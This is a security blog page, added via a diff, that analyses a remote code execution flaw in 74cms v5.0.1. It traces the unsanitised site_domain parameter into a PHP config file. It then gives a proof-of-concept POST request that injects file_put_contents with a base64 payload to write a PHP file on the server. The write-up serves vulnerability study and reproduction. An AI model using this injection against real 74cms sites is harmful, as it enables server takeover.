@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="74cms v5.0.1远程执行代码一、漏洞简介二、漏洞影响74cms v5.0.1 三、复现过程漏洞分析 POST &#x2F;74cms&#x2F;index.php?m&#x3D;Admin&amp;c&#x3D;config&amp;a&#x3D;edit HTTP&#x2F;1.1 Host: 127.0.0.1 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Geck">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="74cms v5.0.1远程执行代码一、漏洞简介二、漏洞影响74cms v5.0.1 三、复现过程漏洞分析 POST &#x2F;74cms&#x2F;index.php?m&#x3D;Admin&amp;c&#x3D;config&amp;a&#x3D;edit HTTP&#x2F;1.1 Host: 127.0.0.1 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Geck">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId27.png">
+<meta property="article:published_time" content="2022-07-08T06:25:51.464Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.676Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-74cms/74cms v5.0.1远程执行代码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" class="article-date">
+  <time datetime="2022-07-08T06:25:51.464Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="74cms-v5-0-1远程执行代码"><a href="#74cms-v5-0-1远程执行代码" class="headerlink" title="74cms v5.0.1远程执行代码"></a>74cms v5.0.1远程执行代码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>74cms v5.0.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId25.png"></p>
+<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 391
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+
+site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=127.0.0.1&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=
+</code></pre>
+<p>c=config&amp;a=edit -&gt; Controller=config&amp;action=edit -&gt;<br>/Application/Admin/Controller/ConfigController.class.php Line 9:<br>I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;) -&gt; trim($site_domain,&#39;/&#39;)<br>-&gt; &#39;.&#39;.implode(&#39;.&#39;,$domain) -&gt; array(&#39;domain&#39;=&gt;$domain) -&gt;<br>$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;)</p>
+<pre><code>public function edit()&#123;
+       if(IS_POST)&#123;
+           $site_domain = I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;);
+           $site_domain = trim($site_domain,&#39;/&#39;);
+           $site_dir = I(&#39;request.site_dir&#39;,C(&#39;qscms_site_dir&#39;),&#39;trim&#39;);
+           $site_dir = $site_dir==&#39;&#39;?&#39;/&#39;:$site_dir;
+           $site_dir = $site_dir==&#39;/&#39;?$site_dir:(&#39;/&#39;.trim($site_dir,&#39;/&#39;).&#39;/&#39;);
+           $_POST[&#39;site_dir&#39;] = $site_dir;
+           if($site_domain &amp;&amp; $site_domain != C(&#39;qscms_site_domain&#39;))&#123;
+               if($site_domain == C(&#39;qscms_wap_domain&#39;))&#123;
+                   $this-&gt;returnMsg(0,&#39;主域名不能与触屏版域名重复！&#39;);
+               &#125;
+               $str = str_replace(&#39;http://&#39;,&#39;&#39;,$site_domain);
+               $str = str_replace(&#39;https://&#39;,&#39;&#39;,$str);
+               if(preg_match(&#39;/com.cn|net.cn|gov.cn|org.cn$/&#39;,$str) === 1)&#123;
+                   $domain = array_slice(explode(&#39;.&#39;, $str), -3, 3);
+               &#125;else&#123;
+                   $domain = array_slice(explode(&#39;.&#39;, $str), -2, 2);
+               &#125;
+               $domain = &#39;.&#39;.implode(&#39;.&#39;,$domain);
+               $config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
+               $config[&#39;COOKIE_DOMAIN&#39;] = $domain;
+               $this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);
+           &#125;
+</code></pre>
+<p>/ThinkPHP/Common/functions.php第271行中的I（&#39;request.site_domain&#39;，&#39;&#39;，&#39;trim&#39;）是字符串。request.site_domain-&gt;<br>$ _REQUEST [&#39;site_domain&#39;]-&gt; $ _ REQUEST<br>[&#39;site_domain&#39;]是字符串-&gt;修剪（$ _REQUEST [&#39;site_domain&#39;]）</p>
+<pre><code>function I($name,$default=&#39;&#39;,$filter=null,$datas=null) &#123;
+    ...
+    if(strpos($name,&#39;.&#39;)) &#123; // 指定参数来源
+        list($method,$name) =   explode(&#39;.&#39;,$name,2);
+    &#125;else&#123; // 默认为自动判断
+        $method =   &#39;param&#39;;
+    &#125;
+    switch(strtolower($method)) &#123;
+        case &#39;get&#39;     :   
+            $input =&amp; $_GET;
+            break;
+        case &#39;post&#39;    :   
+            $input =&amp; $_POST;
+            break;
+        ...
+        case &#39;request&#39; :   
+            $input =&amp; $_REQUEST;   
+            break;
+        ...
+    &#125;
+    if(&#39;&#39;==$name) &#123; // 获取全部变量
+      ...
+        &#125;
+    &#125;elseif(isset($input[$name])) &#123; // 取值操作
+        $data       =   $input[$name];
+        $filters = isset($filter) ? $filter.&#39;,&#39;.C(&#39;DEFAULT_FILTER&#39;) : C(&#39;DEFAULT_FILTER&#39;);
+        //$filters    =   isset($filter)?$filter:C(&#39;DEFAULT_FILTER&#39;);
+        if($filters) &#123;
+            if(is_string($filters))&#123;
+                if(0 === strpos($filters,&#39;/&#39;))&#123;
+                    if(1 !== preg_match($filters,(string)$data))&#123;
+                        // 支持正则验证
+                        return   isset($default) ? $default : null;
+                    &#125;
+                &#125;else&#123;
+                    $filters    =   explode(&#39;,&#39;,$filters);                    
+                &#125;
+            &#125;elseif(is_int($filters))&#123;
+                $filters    =   array($filters);
+            &#125;
+            
+            if(is_array($filters))&#123;
+                foreach($filters as $filter)&#123;
+                    if(function_exists($filter)) &#123;
+                        $data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤
+                    &#125;else&#123;
+                        $data   =   filter_var($data,is_int($filter) ? $filter : filter_id($filter));
+                        if(false === $data) &#123;
+                            return   isset($default) ? $default : null;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+        if(!empty($type))&#123;
+          ...
+    &#125;else&#123; // 变量默认值
+        $data       =    isset($default)?$default:null;
+    &#125;
+    is_array($data) &amp;&amp; array_walk_recursive($data,&#39;think_filter&#39;);
+    return $data;
+&#125;
+</code></pre>
+<p>返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（&#39;SESSION_OPTIONS&#39;=&gt;<br>array（&#39;domain&#39;=&gt; $ domain），&#39;COOKIE_DOMAIN&#39;=&gt; $ domain） -&gt;<br>update_config（$ config， CONF_PATH.&#39;url.php&#39;）</p>
+<pre><code>$config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);
+$config[&#39;COOKIE_DOMAIN&#39;] = $domain;
+$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);
+</code></pre>
+<p>/Application/Common/Controller/BackendController.class.php第467<br>行中的update_config（$ config，CONF_PATH.&#39;url.php&#39;）：</p>
+<p>multimerge（$ config，$ new_config） -&gt; file_put_contents（$<br>config_file，” &lt;？php \ nreturn”。stripslashes（var_export（$<br>config，true））。”;”，LOCK_EX）</p>
+<pre><code>    public function update_config($new_config, $config_file = &#39;&#39;) &#123;
+        !is_file($config_file) &amp;&amp; $config_file = HOME_CONFIG_PATH . &#39;config.php&#39;;
+        if (is_writable($config_file)) &#123;
+            $config = require $config_file;
+            $config = multimerge($config, $new_config);
+            if($config[&#39;SESSION_OPTIONS&#39;])&#123;
+                $config[&#39;SESSION_OPTIONS&#39;][&#39;path&#39;] = SESSION_PATH;
+            &#125;
+            file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;, LOCK_EX);
+            @unlink(RUNTIME_FILE);
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>multimerge($config, $new_config) in<br>/Application/Common/Common/function.php Line 938: no restricted</p>
+<pre><code>function multimerge($a, $b) &#123;
+    if (is_array($b) &amp;&amp; count($b)) &#123;
+        foreach ($b as $k =&gt; $v) &#123;
+            if (is_array($v) &amp;&amp; count($v)) &#123;
+                $a[$k] = in_array($k, array(&#39;SESSION_OPTIONS&#39;)) ? multimerge($a[$k], $v) : $v;
+            &#125; else &#123;
+                $a[$k] = $v;
+            &#125;
+        &#125;
+    &#125; else &#123;
+        $a = $b;
+    &#125;
+    return $a;
+&#125;
+</code></pre>
+<p>CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.&#39;url.php&#39; -&gt;<br>/Application/Common/Conf/url.php</p>
+<pre><code>defined(&#39;COMMON_PATH&#39;)  or define(&#39;COMMON_PATH&#39;,    APP_PATH.&#39;Common/&#39;); // 应用公共目录
+defined(&#39;CONF_PATH&#39;)    or define(&#39;CONF_PATH&#39;,      COMMON_PATH.&#39;Conf/&#39;);
+define(&#39;APP_PATH&#39;,&#39;./Application/&#39;);
+</code></pre>
+<p>var_export(): Quote string with slashes&amp;Convert special characters to<br>HTML entities -&gt; stripslashes(): un-quotes a quoted string -&gt; Convert<br>special characters to HTML entities -&gt; write file</p>
+<pre><code>file_put_contents($config_file, &quot;&lt;?php \nreturn &quot; . stripslashes(var_export($config, true)) . &quot;;&quot;,LOCK_
+</code></pre>
+<p>/Application/Home/Conf/url.php: The code after &quot;return array(...);&quot;<br>does not work, so payload is site_domain=&#39;, {your php code},&#39;</p>
+<pre><code>&lt;?php 
+return array (
+  &#39;URL_MODEL&#39; =&gt; 0,
+  &#39;URL_HTML_SUFFIX&#39; =&gt; &#39;.html&#39;,
+  &#39;URL_PATHINFO_DEPR&#39; =&gt; &#39;/&#39;,
+  &#39;URL_ROUTER_ON&#39; =&gt; true,
+  &#39;URL_ROUTE_RULES&#39; =&gt; 
+  array (
+    &#39;/^jobfair\/(?!admin)(\w+)$/&#39; =&gt; &#39;jobfair/index/:1&#39;,
+    &#39;/^mall\/(?!admin)(\w+)$/&#39; =&gt; &#39;mall/index/:1&#39;,
+  ),
+  &#39;QSCMS_VERSION&#39; =&gt; &#39;5.0.1&#39;,
+  &#39;QSCMS_RELEASE&#39; =&gt; &#39;2019-03-19 00:00:00&#39;,
+  &#39;SESSION_OPTIONS&#39; =&gt; 
+  array (
+    &#39;domain&#39; =&gt; &#39;.0.1&#39;,
+    0 =&gt; 18,
+    1 =&gt; &#39;&#39;,
+    &#39;path&#39; =&gt; &#39;D:\***\***\***\WWW\74cms\data\session&#39;,
+  ),
+  &#39;COOKIE_DOMAIN&#39; =&gt; &#39;.0.1&#39;,
+  0 =&gt; 18,
+  1 =&gt; &#39;&#39;,
+);
+</code></pre>
+<h3 id="复现poc"><a href="#复现poc" class="headerlink" title="复现poc"></a>复现poc</h3><p>-&gt; PD9waHAgcGhwaW5mbygpOz8+</p>
+<p>site_domain=&#39;,<br>file_put_contents(&#39;403.php&#39;,base64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8+&#39;)),&#39;</p>
+<pre><code>POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 465
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+
+site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=&#39;%2C+file_put_contents(&#39;403.php&#39;%2Cbase64_decode(&#39;PD9waHAgcGhwaW5mbygpOz8%2B&#39;))%2C&#39;&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=
+GET /74cms/Application/Common/Conf/url.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre>
+<p>成功截图</p>
+<p><img src="/resource/74cmsv5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/media/rId27.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md">https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" data-id="cl5c2qlbi000my8v1fsni76ia" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/74cms/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/74cms/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
